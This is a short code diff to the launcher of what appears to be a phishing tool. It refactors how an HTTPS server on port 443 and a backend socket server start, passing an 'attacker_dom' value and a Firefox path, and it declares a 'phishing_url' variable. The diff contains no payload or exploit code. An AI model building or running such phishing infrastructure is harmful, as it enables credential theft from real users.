@@ -2,7 +2,9 @@ import sys
 from netifaces import interfaces, ifaddresses, AF_INET
 import os
 from client import https_server
-from backend import socket_server
+from backend.socket_server import SocketServer
+import mechanize
+import threading
 
 phishing_url = ""
 attacker_dom = ""
@@ -43,9 +45,8 @@ else:
 	host = sys.argv[1]
 
 print("Localhost is", host)
-print("Starting https server on port 443...")
-https_server.startServer(host)
 print("Starting backend server...")
-socket_server.startServer(host, attacker_dom, firefox_path)
-
-
+socket_server = SocketServer(host, attacker_dom, firefox_path)
+print("Starting https server on port 443...")
+threading.Thread(target=https_server.start_server, args=(host, attacker_dom, socket_server)).start()
+socket_server.start_server()
